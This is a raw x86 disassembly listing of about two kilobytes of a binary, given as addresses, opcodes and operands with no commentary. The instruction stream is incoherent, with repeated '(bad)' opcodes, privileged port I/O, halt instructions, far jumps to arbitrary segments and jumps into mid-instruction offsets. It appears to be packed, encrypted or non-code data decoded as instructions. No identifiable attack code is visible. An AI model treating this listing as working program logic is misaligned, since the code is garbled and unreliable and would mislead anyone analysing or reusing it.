  406814:	mov    eax,0x68a10a66
  406819:	sbb    dh,BYTE PTR [ecx+0x60]
  40681c:	dec    eax
  40681d:	lods   al,BYTE PTR ds:[esi]
  40681e:	nop
  40681f:	nop
  406820:	cld    
  406821:	cld    
  406822:	or     DWORD PTR [esi+ecx*1-0x6cdb31f],ebp
  406829:	cmp    bh,ch
  40682b:	or     dh,BYTE PTR [edx+0x667498f4]
  406831:	xchg   esi,eax
  406832:	jle    0x40683d
  406834:	in     eax,dx
  406835:	push   edx
  406836:	xlat   BYTE PTR ds:[ebx]
  406837:	adc    DWORD PTR [ebx-0x1d],ecx
  40683a:	adc    BYTE PTR [edi],bl
  40683c:	int3   
  40683d:	add    dh,al
  40683f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406840:	outs   dx,BYTE PTR ds:[esi]
  406841:	out    dx,eax
  406842:	xlat   BYTE PTR ds:[ebx]
  406843:	imul   eax,DWORD PTR [esp+edi*1-0x69677869],0x87e24974
  40684e:	call   0xbccb:0x4d5c7e8b
  406855:	(bad)  
  406857:	pop    ebx
  406858:	aaa    
  406859:	rol    BYTE PTR [ebx-0x749d60fe],0x54
  406860:	add    bh,ch
  406862:	xchg   edi,eax
  406863:	out    dx,eax
  406864:	mov    esi,0x106d5728
  406869:	lahf   
  40686a:	fnsave [ebx]
  40686c:	pop    edx
  40686d:	sbb    ecx,DWORD PTR [ebp+eax*4-0x7e]
  406871:	jo     0x40681d
  406873:	cmp    BYTE PTR [eax-0x3b],0xe4
  406877:	mov    bh,0x4f
  406879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40687a:	ins    DWORD PTR es:[di],dx
  40687c:	fmul   DWORD PTR [esi+0x4a]
  40687f:	enter  0x11f5,0x55
  406883:	add    ah,BYTE PTR [edx-0x5fe6971]
  406889:	fcmovnu st,st(6)
  40688b:	jnp    0x4068f4
  40688d:	enter  0xde75,0x4b
  406891:	xlat   BYTE PTR ds:[ebx]
  406892:	lahf   
  406893:	dec    ebx
  406894:	mov    edi,0x210554cb
  406899:	or     al,0x2f
  40689b:	push   ds
  40689c:	stc    
  40689d:	(bad)  
  40689e:	lea    edi,[eax*4+0x9b16eca]
  4068a5:	xchg   edi,eax
  4068a6:	fist   WORD PTR [ecx]
  4068a8:	ins    DWORD PTR es:[edi],dx
  4068a9:	dec    edx
  4068aa:	lods   al,BYTE PTR ds:[esi]
  4068ab:	bound  eax,QWORD PTR [eax-0x43]
  4068ae:	sbb    al,0x8e
  4068b0:	fmul   QWORD PTR [eax-0x3bb842ca]
  4068b6:	fmulp  st(2),st
  4068b8:	lods   al,BYTE PTR ds:[esi]
  4068b9:	stc    
  4068ba:	lods   eax,DWORD PTR ds:[esi]
  4068bb:	mov    ebx,0x17177dfe
  4068c0:	shl    esi,1
  4068c2:	jge    0x4068b9
  4068c4:	sbb    dh,dl
  4068c6:	outs   dx,DWORD PTR ds:[esi]
  4068c7:	lahf   
  4068c8:	scas   eax,DWORD PTR es:[edi]
  4068c9:	inc    ebx
  4068ca:	and    bp,si
  4068cd:	lock dec esi
  4068cf:	push   eax
  4068d0:	dec    esi
  4068d1:	aad    0x91
  4068d3:	fsub   st(6),st
  4068d5:	or     al,0x11
  4068d7:	into   
  4068d8:	lods   al,BYTE PTR ds:[esi]
  4068d9:	pop    esp
  4068da:	dec    ecx
  4068db:	in     eax,dx
  4068dc:	ficomp DWORD PTR [edx+0x29]
  4068df:	test   al,0xdf
  4068e1:	or     al,0xc1
  4068e3:	sub    DWORD PTR [ecx+0x37972154],0x28182044
  4068ed:	add    eax,0x239fca8c
  4068f2:	xor    eax,0xacd26be3
  4068f7:	lods   al,BYTE PTR ds:[esi]
  4068f8:	pushf  
  4068f9:	or     ecx,DWORD PTR [ecx+0x68]
  4068fc:	dec    ecx
  4068fd:	jg     0x406954
  4068ff:	test   DWORD PTR [ecx-0x2d],0x4471aa42
  406906:	mov    DWORD PTR [ebp+0x41],ebx
  406909:	jae    0x4068d2
  40690b:	dec    edx
  40690c:	xchg   BYTE PTR [edx+eiz*2-0x71],ch
  406910:	mov    WORD PTR [eax+0x48],ss
  406913:	push   cs
  406914:	dec    edx
  406915:	imul   edx,DWORD PTR [eax-0x1a59c494],0xf04973eb
  40691f:	sbb    esi,DWORD PTR [eax+0x1f]
  406922:	jp     0x4068a8
  406924:	mov    ebx,0xa91cab45
  406929:	lds    esi,FWORD PTR [edx-0x2834f5ab]
  40692f:	call   DWORD PTR [eax]
  406931:	loopne 0x40694b
  406933:	ins    BYTE PTR es:[edi],dx
  406934:	nop
  406935:	jo     0x4069af
  406937:	aaa    
  406938:	jne    0x40697a
  40693a:	cmc    
  40693b:	push   ss
  40693c:	lds    ecx,FWORD PTR [eax-0x7e]
  40693f:	daa    
  406940:	lods   al,BYTE PTR ds:[esi]
  406941:	or     al,0xa0
  406943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406944:	pop    edi
  406945:	das    
  406946:	jns    0x406973
  406948:	cld    
  406949:	sbb    eax,0x402daeec
  40694e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40694f:	dec    ebp
  406950:	les    eax,FWORD PTR [ebx+0x6a67b02d]
  406956:	cmp    ah,BYTE PTR [ebp-0x4d]
  406959:	adc    esp,DWORD PTR ds:0x15b446cb
  40695f:	sbb    BYTE PTR ds:0x1f713964,cl
  406965:	sti    
  406966:	lods   eax,DWORD PTR ds:[esi]
  406967:	jmp    0x465d:0x5f6473d9
  40696e:	scas   eax,DWORD PTR es:[edi]
  40696f:	les    ebp,FWORD PTR ds:0x54e3019f
  406975:	fmul   QWORD PTR [ebx+0x5a]
  406978:	pop    esi
  406979:	fdivr  QWORD PTR [esi]
  40697b:	sbb    BYTE PTR [ecx+0x445f8251],0x6d
  406982:	xchg   BYTE PTR [eax],al
  406984:	shr    BYTE PTR [edx-0x4bf98b8d],1
  40698a:	and    cl,bl
  40698c:	or     ebp,DWORD PTR ds:0x7ffa1095
  406992:	and    bl,bh
  406994:	popf   
  406995:	rcl    ebp,cl
  406997:	inc    eax
  406998:	add    ebp,esp
  40699a:	pop    edx
  40699b:	out    0xa2,al
  40699d:	xchg   BYTE PTR [esi],cl
  40699f:	ja     0x406950
  4069a1:	mov    cl,0x9
  4069a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069a4:	rol    BYTE PTR [eax],1
  4069a6:	mov    cl,dl
  4069a8:	sahf   
  4069a9:	fcomp  QWORD PTR [ebx-0x50]
  4069ac:	or     al,0xcf
  4069ae:	add    ebp,DWORD PTR [ebx-0x331d839f]
  4069b4:	xor    DWORD PTR [ebx+eax*4+0x5c73d637],edi
  4069bb:	mov    eax,ds:0xc441c31e
  4069c0:	pop    eax
  4069c1:	and    eax,0x76cf0d10
  4069c6:	aas    
  4069c7:	mov    BYTE PTR [ebp+0x1dd57274],al
  4069cd:	es mov ch,0x65
  4069d0:	adc    DWORD PTR [ebx],edx
  4069d2:	cmc    
  4069d3:	fsubrp st(3),st
  4069d5:	push   cx
  4069d7:	or     ecx,DWORD PTR [edx]
  4069d9:	inc    ecx
  4069da:	dec    esi
  4069db:	mov    ebx,0xc9db9bbf
  4069e0:	ins    BYTE PTR es:[edi],dx
  4069e1:	jmp    0xf4a5:0xa1dfb648
  4069e8:	mov    BYTE PTR [eax-0x96f7218],dh
  4069ee:	int3   
  4069ef:	dec    ecx
  4069f0:	mov    ebx,0x2da6340f
  4069f5:	sub    DWORD PTR [ecx],esi
  4069f7:	cmp    ebp,ebx
  4069f9:	loope  0x406a6d
  4069fb:	cmp    ecx,ebp
  4069fd:	pop    esi
  4069fe:	aad    0xde
  406a00:	push   ss
  406a01:	add    al,0xc0
  406a03:	dec    edx
  406a04:	mov    bh,0x8b
  406a06:	mov    ds:0xd0a056df,eax
  406a0b:	dec    edi
  406a0c:	retf   0x9b4a
  406a0f:	jne    0x4069d2
  406a11:	mov    al,ds:0xdefb8ab6
  406a16:	xchg   esp,eax
  406a17:	adc    edi,ecx
  406a19:	add    eax,DWORD PTR [esi+0x6f6d5f2a]
  406a1f:	inc    esp
  406a20:	xchg   esp,eax
  406a21:	aam    0xaa
  406a23:	jnp    0x406a9e
  406a25:	jo     0x406a03
  406a27:	pushf  
  406a28:	aam    0xcf
  406a2a:	bound  edi,QWORD PTR [ebp+0x52f8db31]
  406a30:	cmp    ch,BYTE PTR [ecx+0x715c250d]
  406a36:	fcomp  DWORD PTR [edi-0x2378418a]
  406a3c:	gs cli 
  406a3e:	add    DWORD PTR [edi+0x7f4b25a9],esi
  406a44:	nop
  406a45:	mov    ah,ch
  406a47:	cmp    al,0x4c
  406a49:	and    bh,BYTE PTR [esi]
  406a4b:	lea    eax,[ecx-0x661805f0]
  406a51:	xchg   edx,eax
  406a52:	lock jo 0x4069da
  406a55:	mov    dl,0xfd
  406a57:	jp     0x406a9e
  406a59:	out    dx,eax
  406a5a:	sar    BYTE PTR [eax+eax*2-0x5b],0xd4
  406a5f:	mov    dl,0xe1
  406a61:	enter  0x1b3f,0x89
  406a65:	jecxz  0x406ace
  406a67:	int3   
  406a68:	cmp    bl,dl
  406a6a:	jp     0x406a33
  406a6c:	mov    WORD PTR [edi+0x473f8724],ss
  406a72:	push   edx
  406a73:	jno    0x406a5a
  406a75:	test   BYTE PTR ds:0x366dedb5,0xdb
  406a7c:	xchg   esi,eax
  406a7d:	mov    eax,0x97657f6f
  406a82:	test   al,0xfc
  406a84:	test   BYTE PTR [edi+ecx*1],0x8f
  406a88:	jecxz  0x406a53
  406a8a:	jbe    0x406ad2
  406a8c:	and    bl,BYTE PTR [edi+0x76771b87]
  406a92:	adc    al,0xc
  406a94:	jmp    0x406aa2
  406a96:	es test edx,ecx
  406a99:	bound  ecx,QWORD PTR [ebx-0x2f843b6a]
  406a9f:	mov    DWORD PTR [ebp+ebp*4+0x73cb8],ecx
  406aa6:	add    eax,0xca2fd138
  406aab:	mov    ebx,0xcff03956
  406ab0:	inc    esp
  406ab1:	imul   edi,DWORD PTR [ecx-0x63],0xffffffe8
  406ab5:	adc    esi,eax
  406ab7:	cmp    al,0x2a
  406ab9:	test   BYTE PTR [edi+0x18003ec0],bl
  406abf:	call   0x14ad2881
  406ac4:	mov    BYTE PTR [ebx-0x2f],dh
  406ac7:	push   ds
  406ac8:	iret   
  406ac9:	and    DWORD PTR [edi+0x7391ea69],edi
  406acf:	cmc    
  406ad0:	mov    WORD PTR [ebp+0x50],?
  406ad3:	sbb    al,0xdf
  406ad5:	cmp    DWORD PTR [edi],esi
  406ad7:	lods   al,BYTE PTR ds:[esi]
  406ad8:	icebp  
  406ad9:	cmp    dl,dh
  406adb:	pop    esp
  406adc:	add    eax,0xce96d86a
  406ae1:	mov    ch,0x50
  406ae3:	and    ch,0xb2
  406ae6:	push   ecx
  406ae7:	add    al,0xb8
  406ae9:	push   ebx
  406aea:	dec    edx
  406aeb:	mov    ds:0x60aea227,eax
  406af0:	(bad)  
  406af1:	cmp    al,BYTE PTR [ecx+0x4c2c1e2f]
  406af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406af8:	fcom   QWORD PTR [ebx+ebx*2]
  406afb:	pop    esp
  406afc:	test   al,0x68
  406afe:	clc    
  406aff:	test   BYTE PTR [eax],bl
  406b01:	dec    ecx
  406b02:	xchg   ecx,eax
  406b03:	mov    edi,es
  406b05:	push   ecx
  406b06:	test   al,0x3b
  406b08:	xchg   ecx,eax
  406b09:	mov    ch,0x22
  406b0b:	xor    edx,edx
  406b0d:	mov    al,0xf
  406b0f:	mov    bl,0xd0
  406b11:	adc    eax,0x8f8f16f0
  406b16:	cmp    eax,0x710f608a
  406b1b:	mov    cl,0x58
  406b1d:	xor    BYTE PTR [eax],ah
  406b1f:	xor    bh,BYTE PTR [eax]
  406b21:	mov    dl,0x46
  406b23:	ja     0x406ab7
  406b25:	call   0xa9ee:0x9103bc95
  406b2c:	dec    ecx
  406b2d:	dec    eax
  406b2e:	and    cl,BYTE PTR [edx-0x5a5ecc58]
  406b34:	cmp    ebx,DWORD PTR [edx-0x51731076]
  406b3a:	push   cs
  406b3b:	pop    es
  406b3c:	dec    ebx
  406b3d:	dec    edx
  406b3e:	or     dl,dh
  406b40:	outs   dx,DWORD PTR ds:[esi]
  406b41:	enter  0x4504,0xdd
  406b45:	xchg   ebx,eax
  406b46:	mov    BYTE PTR [ecx],dl
  406b48:	pop    edi
  406b49:	ins    DWORD PTR es:[edi],dx
  406b4a:	fcmovbe st,st(1)
  406b4c:	or     eax,0x347726ec
  406b51:	shr    DWORD PTR [esi+edx*1],1
  406b54:	jmp    0x5ac11f36
  406b59:	inc    ecx
  406b5a:	les    edx,FWORD PTR [ebx+0x4d]
  406b5d:	inc    esp
  406b5e:	jmp    0x406b3a
  406b60:	jbe    0x406b1f
  406b62:	mov    al,0x30
  406b64:	push   ebx
  406b65:	jbe    0x406bd7
  406b67:	repz push ebp
  406b69:	dec    ecx
  406b6a:	mov    esi,0xe71d0e7c
  406b6f:	xchg   ebp,eax
  406b70:	std    
  406b71:	jne    0x406b2a
  406b73:	test   al,0xee
  406b75:	hlt    
  406b76:	mov    ds:0x823c5202,al
  406b7b:	test   al,0xba
  406b7d:	ja     0x406bce
  406b7f:	pop    ebx
  406b80:	push   cs
  406b81:	enter  0x2eff,0x69
  406b85:	mov    ds:0x1cb0e8d4,al
  406b8a:	out    dx,al
  406b8b:	jmp    0x406b2e
  406b8d:	and    al,0xfd
  406b8f:	or     ebx,DWORD PTR [ebp+0x64]
  406b92:	push   eax
  406b93:	test   eax,0x53a73d4d
  406b98:	and    eax,0x9cbdc6b4
  406b9d:	call   0xf34b:0x620ccf14
  406ba4:	test   DWORD PTR [esi+0x731a518],ebx
  406baa:	stc    
  406bab:	leave  
  406bac:	mov    eax,ds:0x26926b7f
  406bb1:	mov    ebx,0xafffc33a
  406bb6:	jnp    0x406b4f
  406bb8:	or     edi,edi
  406bba:	into   
  406bbb:	cwde   
  406bbc:	das    
  406bbd:	pop    esi
  406bbe:	(bad)  
  406bbf:	mov    esi,0xbaec0ea
  406bc4:	add    dl,bl
  406bc6:	lea    ebx,[eax-0x7a]
  406bc9:	fcomp  QWORD PTR ds:0x5cb14e93
  406bcf:	ffreep st(7)
  406bd1:	jnp    0x406be6
  406bd3:	(bad)  
  406bd4:	sti    
  406bd5:	std    
  406bd6:	jge    0x406c0a
  406bd8:	arpl   WORD PTR [ebx],di
  406bda:	std    
  406bdb:	jb     0x406bb9
  406bdd:	mov    ecx,0x67da9c55
  406be2:	mov    ecx,0x30507f0e
  406be7:	or     eax,0xe3651a9a
  406bec:	loop   0x406bcb
  406bee:	ret    
  406bef:	das    
  406bf0:	mov    ebx,0x9103016c
  406bf5:	jbe    0x406bbb
  406bf7:	out    dx,eax
  406bf8:	mov    gs,WORD PTR [si+0x339d]
  406bfd:	and    eax,0x285e66c7
  406c02:	mov    bh,0xb4
  406c04:	pop    ebp
  406c05:	clc    
  406c06:	jle    0x406ba0
  406c08:	or     bl,ch
  406c0a:	loope  0x406bd0
  406c0c:	popa   
  406c0d:	cwde   
  406c0e:	imul   edi,DWORD PTR [edi+0x5a14c1e1],0xffffff87
  406c15:	pop    ecx
  406c16:	ins    DWORD PTR es:[edi],dx
  406c17:	sbb    al,dh
  406c19:	adc    ah,dl
  406c1b:	and    bl,cl
  406c1d:	inc    ebx
  406c1e:	inc    eax
  406c1f:	inc    esp
  406c20:	jmp    0xe09ddab6
  406c25:	sub    al,BYTE PTR [ebx-0x7137436c]
  406c2b:	inc    eax
  406c2c:	cld    
  406c2d:	mov    edx,0xc2377b86
  406c32:	push   ss
  406c33:	popa   
  406c34:	xchg   ebp,eax
  406c35:	mov    dl,0xe4
  406c37:	jle    0x406bcc
  406c39:	jecxz  0x406bcf
  406c3b:	jbe    0x406bc3
  406c3d:	pop    eax
  406c3e:	inc    edi
  406c3f:	cmp    al,BYTE PTR [edx-0x7f]
  406c42:	or     al,0xd8
  406c44:	jbe    0x406cb2
  406c46:	inc    esi
  406c47:	jmp    0xec654fd4
  406c4c:	or     ecx,DWORD PTR [ebp+0x1b]
  406c4f:	inc    eax
  406c50:	leave  
  406c51:	aaa    
  406c52:	mov    edi,0xa9fa99d4
  406c57:	pop    ecx
  406c58:	rcr    al,1
  406c5a:	daa    
  406c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c5c:	hlt    
  406c5d:	cmp    ch,BYTE PTR [eax+edi*1]
  406c60:	aaa    
  406c61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c62:	dec    esp
  406c63:	lock adc ecx,ebp
  406c66:	xor    eax,0x5bbce7d3
  406c6b:	adc    al,0x36
  406c6d:	ins    DWORD PTR es:[edi],dx
  406c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c6f:	inc    esp
  406c70:	imul   edi,DWORD PTR [ebp+0x7373e66d],0xe3395250
  406c7a:	adc    ebp,ebp
  406c7c:	dec    ebp
  406c7d:	cmp    ecx,DWORD PTR [ebx-0x8]
  406c80:	fdiv   st(1),st
  406c82:	fisubr DWORD PTR [ecx]
  406c84:	ret    0xf910
  406c87:	xor    ecx,DWORD PTR [edi]
  406c89:	es push ss
  406c8b:	dec    edi
  406c8c:	sub    esi,DWORD PTR [edi+0x5cedf407]
  406c92:	pushf  
  406c93:	icebp  
  406c94:	mov    DWORD PTR [ebp-0x28],eax
  406c97:	retf   
  406c98:	or     al,0x23
  406c9a:	sub    DWORD PTR [eax-0x7328c400],esi
  406ca0:	xor    al,0x2d
  406ca2:	and    DWORD PTR [ebx+esi*1+0x49],esp
  406ca6:	pop    ecx
  406ca7:	jns    0x406ca1
  406ca9:	ins    DWORD PTR es:[edi],dx
  406caa:	cmp    DWORD PTR [edx],edi
  406cac:	(bad)  [edx+0x653c6027]
  406cb2:	popf   
  406cb3:	imul   ebx,eax,0x62
  406cb6:	sbb    BYTE PTR [edi],dl
  406cb8:	push   ss
  406cb9:	cdq    
  406cba:	sub    eax,0x2c3f91c0
  406cbf:	pop    edx
  406cc0:	fisubr WORD PTR [edi+eax*4+0x35]
  406cc4:	std    
  406cc5:	mov    esi,0x210707e0
  406cca:	lea    edx,[ecx]
  406ccc:	iret   
  406ccd:	sub    DWORD PTR [edx-0x28],ebp
  406cd0:	or     BYTE PTR [ebx-0x1e],al
  406cd3:	hlt    
  406cd4:	or     BYTE PTR [edx+0x49b52b7c],bl
  406cda:	outs   dx,BYTE PTR ds:[esi]
  406cdb:	xchg   esi,eax
  406cdc:	outs   dx,DWORD PTR ds:[esi]
  406cdd:	inc    ebx
  406cde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cdf:	or     DWORD PTR [edi*8-0x70e9b037],ecx
  406ce6:	pop    ss
  406ce7:	retf   0x4858
  406cea:	(bad)  
  406ceb:	not    BYTE PTR [esi+ecx*2-0x3ab1848f]
  406cf2:	rol    BYTE PTR [esi+edx*1],0xb0
  406cf6:	call   0x37093796
  406cfb:	cs jb  0x406cbb
  406cfe:	ins    DWORD PTR es:[edi],dx
  406cff:	ins    DWORD PTR es:[edi],dx
  406d00:	js     0x406cf9
  406d02:	loope  0x406ce8
  406d04:	mov    esi,0x83a7c6a8
  406d09:	pop    ds
  406d0a:	in     al,dx
  406d0b:	xor    DWORD PTR [ebx],0x333220dc
  406d11:	cmc    
  406d12:	cli    
  406d13:	mov    eax,ds:0x5f7835dd
  406d18:	push   edi
  406d19:	sbb    al,0xd7
  406d1b:	or     eax,0xef61ffb3
  406d20:	adc    al,0x70
  406d22:	xor    bl,BYTE PTR [edx+0x786e10fe]
  406d28:	xchg   BYTE PTR [ebx-0x30a6d855],cl
  406d2e:	sahf   
  406d2f:	sbb    ecx,DWORD PTR [eax-0x2c2c545b]
  406d35:	mov    ah,0x75
  406d37:	daa    
  406d38:	xor    BYTE PTR [edx],ch
  406d3a:	cwde   
  406d3b:	xor    al,0xe5
  406d3d:	pop    edx
  406d3e:	stc    
  406d3f:	mov    ebx,0xa3efd7db
  406d44:	test   DWORD PTR [eax+0x63],edx
  406d47:	out    0x8c,eax
  406d49:	aad    0xe3
  406d4b:	lea    ecx,[eax-0x4928d284]
  406d51:	mov    eax,0x737a9a79
  406d56:	outs   dx,BYTE PTR ds:[esi]
  406d57:	sbb    esi,edi
  406d59:	jo     0x406d71
  406d5b:	inc    ecx
  406d5c:	mov    bl,0x76
  406d5e:	stc    
  406d5f:	mov    edi,es
  406d61:	ret    0xb4b6
  406d64:	sub    DWORD PTR [edi],ebx
  406d66:	add    eax,0x688b8805
  406d6b:	mov    dh,0xcd
  406d6d:	or     al,0x7e
  406d6f:	pusha  
  406d70:	ja     0x406d47
  406d72:	clc    
  406d73:	mov    ah,0x9e
  406d75:	jle    0x406d93
  406d77:	and    sp,bx
  406d7a:	data16 or ah,BYTE PTR [eax]
  406d7d:	mov    bh,0x14
  406d7f:	loop   0x406da8
  406d81:	ret    
  406d82:	rcl    BYTE PTR [ebx],1
  406d84:	push   cs
  406d85:	es ja  0x406d7b
  406d88:	fs push edi
  406d8a:	xchg   ebp,eax
  406d8b:	xchg   edx,eax
  406d8c:	cli    
  406d8d:	mov    cl,0x9e
  406d8f:	cli    
  406d90:	cli    
  406d91:	jne    0x406d13
  406d93:	into   
  406d94:	aam    0xf5
  406d96:	ret    
  406d97:	sbb    bh,BYTE PTR [edi-0x4cac6c76]
  406d9d:	nop
  406d9e:	sub    al,0x8d
  406da0:	repnz push ss
  406da2:	or     esp,esi
  406da4:	add    al,0x3b
  406da6:	jmp    0x54481802
  406dab:	push   edx
  406dac:	inc    edi
  406dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dae:	jmp    0x528c3888
  406db3:	(bad)  
  406db4:	pusha  
  406db5:	pop    ds
  406db6:	xor    DWORD PTR [ecx+eax*8],ecx
  406db9:	or     al,0xfc
  406dbb:	sub    DWORD PTR [eax],edx
  406dbd:	jmp    0x406d44
  406dbf:	popa   
  406dc0:	out    dx,al
  406dc1:	inc    edi
  406dc2:	cwde   
  406dc3:	(bad)  
  406dc5:	adc    edi,DWORD PTR ds:0x70040eb5
  406dcb:	push   ds
  406dcc:	repz xor edi,DWORD PTR [edx+0x43]
  406dd0:	adc    edi,DWORD PTR [edi+0x36]
  406dd3:	mov    cs,esp
  406dd5:	aas    
  406dd6:	fisubr DWORD PTR [eax-0x469310ac]
  406ddc:	fistp  WORD PTR [esp-0x5355f4ac]
  406de3:	ins    DWORD PTR es:[edi],dx
  406de4:	inc    eax
  406de5:	inc    esi
  406de6:	int    0x22
  406de8:	or     esp,ebp
  406dea:	sti    
  406deb:	xchg   ebp,eax
  406dec:	fisttp DWORD PTR [esi+ecx*8]
  406def:	mov    ah,0x50
  406df1:	inc    esp
  406df2:	pop    edx
  406df3:	add    eax,edi
  406df5:	les    esi,FWORD PTR [edi+0x3b]
  406df8:	and    al,BYTE PTR [edi+0x326f16f2]
  406dfe:	daa    
  406dff:	sti    
  406e00:	jmp    0x8874bebe
  406e05:	clc    
  406e06:	dec    edi
  406e07:	call   0xaddb988e
  406e0c:	and    al,0x2b
  406e0e:	in     al,dx
  406e0f:	dec    ebx
  406e10:	push   ebp
  406e11:	sar    BYTE PTR [ebx+0x58],1
  406e14:	cmp    BYTE PTR [ebx],al
  406e16:	bound  edx,QWORD PTR [ecx+ebx*2-0x12]
  406e1a:	mov    ebx,gs
  406e1c:	mov    ecx,0x6d9d0fa7
  406e21:	and    dh,BYTE PTR [ecx]
  406e23:	daa    
  406e24:	mov    esi,0x74de45d9
  406e29:	dec    ebx
  406e2a:	mov    edx,esi
  406e2c:	aaa    
  406e2d:	add    eax,0xa062d39a
  406e32:	outs   dx,DWORD PTR ds:[esi]
  406e33:	push   cs
  406e34:	in     al,0x66
  406e36:	push   es
  406e37:	pusha  
  406e38:	mov    ch,0x25
  406e3a:	repz imul ebp,ebp,0xf6a844a8
  406e41:	mov    dh,0xac
  406e43:	xchg   ebx,eax
  406e44:	ins    BYTE PTR es:[edi],dx
  406e45:	mov    bh,0x53
  406e47:	in     al,dx
  406e48:	rcr    BYTE PTR ds:0x9da8f8d6,1
  406e4e:	dec    ecx
  406e4f:	aam    0x56
  406e51:	bound  esi,QWORD PTR [edx+0x5e]
  406e54:	mov    edi,0x3c17d910
  406e59:	loopne 0x406e0d
  406e5b:	ins    DWORD PTR es:[edi],dx
  406e5c:	sti    
  406e5d:	hlt    
  406e5e:	add    edi,edx
  406e60:	pop    ss
  406e61:	push   0xfde42b19
  406e66:	fadd   DWORD PTR ds:0x1f198f2c
  406e6c:	sub    DWORD PTR [ebp+0x7],edi
  406e6f:	test   eax,0x70c12577
  406e74:	push   ds
  406e75:	ins    DWORD PTR es:[edi],dx
  406e76:	aas    
  406e77:	pop    eax
  406e78:	sbb    DWORD PTR [esi+ebp*1],ebx
  406e7b:	nop
  406e7c:	js     0x406e6d
  406e7e:	jmp    0xa841:0xea4c9e7a
  406e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e86:	sbb    eax,0x1a4afb6
  406e8b:	pop    ebp
  406e8c:	cdq    
  406e8d:	pop    edi
  406e8e:	add    al,0xe0
  406e90:	xchg   esp,eax
  406e91:	sub    eax,0xf2df7f77
  406e96:	push   0xb25ead66
  406e9b:	popf   
  406e9c:	jmp    0xd61e4ac1
  406ea1:	sub    eax,0x772c43ff
  406ea6:	add    ah,BYTE PTR [edx-0x11451100]
  406eac:	mov    DWORD PTR [eax-0x7],esp
  406eaf:	xor    eax,0xc2c0d879
  406eb4:	mov    edi,0x61f8c476
  406eb9:	xor    eax,0x89410302
  406ebe:	clc    
  406ebf:	mov    BYTE PTR [edx],0x64
  406ec2:	inc    esi
  406ec3:	je     0x406e46
  406ec5:	mov    dh,0xb
  406ec7:	shr    BYTE PTR [edi-0x4fc5669a],0x89
  406ece:	sbb    BYTE PTR [edi-0x1d],0x98
  406ed2:	int3   
  406ed3:	gs jnp 0x406f2d
  406ed6:	(bad)  [edx-0x6656abf1]
  406edc:	sahf   
  406edd:	xchg   ebx,eax
  406ede:	dec    edi
  406edf:	add    al,0x62
  406ee1:	and    ebx,DWORD PTR ds:0x4222aa3b
  406ee7:	sbb    ah,BYTE PTR [eax]
  406ee9:	stos   BYTE PTR es:[edi],al
  406eea:	push   edx
  406eeb:	mov    al,0x4d
  406eed:	mov    eax,ds:0x93538406
  406ef2:	mov    bl,0x7d
  406ef4:	shr    DWORD PTR [ecx+0x75f8fce1],cl
  406efa:	shr    DWORD PTR [edi+0x65],0x68
  406efe:	cmc    
  406eff:	into   
  406f00:	mov    al,0xdd
  406f02:	les    ebx,FWORD PTR [edx]
  406f04:	out    0xc2,al
  406f06:	jmp    0xa3a2:0xa4e03cc2
  406f0d:	inc    eax
  406f0e:	div    BYTE PTR [edx]
  406f10:	pop    esp
  406f11:	loope  0x406f34
  406f13:	push   eax
  406f14:	pop    ebx
  406f15:	lahf   
  406f16:	cmp    eax,0xd9fd9db0
  406f1b:	push   ebp
  406f1c:	ins    BYTE PTR es:[edi],dx
  406f1d:	xor    edi,ebx
  406f1f:	lahf   
  406f20:	ror    BYTE PTR ds:0xf13b2d0,0xdd
  406f27:	not    DWORD PTR [ebx-0x79]
  406f2a:	push   0xa751946
  406f2f:	dec    edx
  406f30:	mov    ebx,0x774a867a
  406f35:	xchg   edi,eax
  406f36:	push   ecx
  406f37:	icebp  
  406f38:	sar    DWORD PTR [ebp+0x6eef2d4b],cl
  406f3e:	mov    al,ds:0xf623e88e
  406f43:	sahf   
  406f44:	mov    cl,0x5e
  406f46:	sahf   
  406f47:	or     eax,0x72ddde4a
  406f4c:	mov    edx,0xf1a1b1cd
  406f51:	xchg   edx,eax
  406f52:	outs   dx,BYTE PTR ds:[esi]
  406f53:	call   0x2d419006
  406f58:	scas   eax,DWORD PTR es:[edi]
  406f59:	xor    dl,dh
  406f5b:	fs cmp eax,0xb2506235
  406f61:	mov    ebp,DWORD PTR [ebp+0x3]
  406f64:	mov    esp,0x4871239f
  406f69:	push   esp
  406f6a:	arpl   WORD PTR [ebp+ebp*8+0x52],cx
  406f6e:	mov    ?,WORD PTR [edx]
  406f70:	bound  ebp,QWORD PTR [ebp+0x47]
  406f73:	xor    DWORD PTR ds:0xf1e961d4,esi
  406f79:	mov    ch,0xaa
  406f7b:	jmp    0x406f95
  406f7d:	pop    esp
  406f7e:	iret   
  406f7f:	or     eax,DWORD PTR [esi]
  406f81:	add    BYTE PTR ds:0xac3284a,dl
  406f87:	cmp    al,0x2
  406f89:	add    dl,ah
  406f8b:	mov    eax,ds:0x6f1886c2
  406f90:	out    0x45,al
  406f92:	lahf   
  406f93:	pop    ss
  406f94:	lds    ecx,FWORD PTR [eax]
  406f96:	add    esp,esi
  406f98:	cmp    al,0xd5
  406f9a:	add    BYTE PTR [eax],bh
  406f9c:	push   ds
  406f9d:	jno    0x406fc3
  406f9f:	aas    
  406fa0:	jmp    0x406f25
  406fa2:	mov    eax,0x9811571
  406fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa8:	outs   dx,DWORD PTR ds:[esi]
  406fa9:	ins    BYTE PTR es:[edi],dx
  406faa:	or     ebx,eax
  406fac:	lds    edx,FWORD PTR [esi]
  406fae:	pop    eax
  406faf:	lods   al,BYTE PTR ds:[esi]
  406fb0:	push   ss
  406fb1:	mov    esp,0x688e8e66
  406fb6:	inc    eax
  406fb7:	sbb    DWORD PTR [eax+0x2b],ebp
  406fba:	push   ebx
  406fbb:	push   DWORD PTR [ecx]
  406fbd:	xchg   esi,eax
  406fbe:	ret    0xc50c
  406fc1:	dec    ebx
  406fc2:	cmp    al,0x90
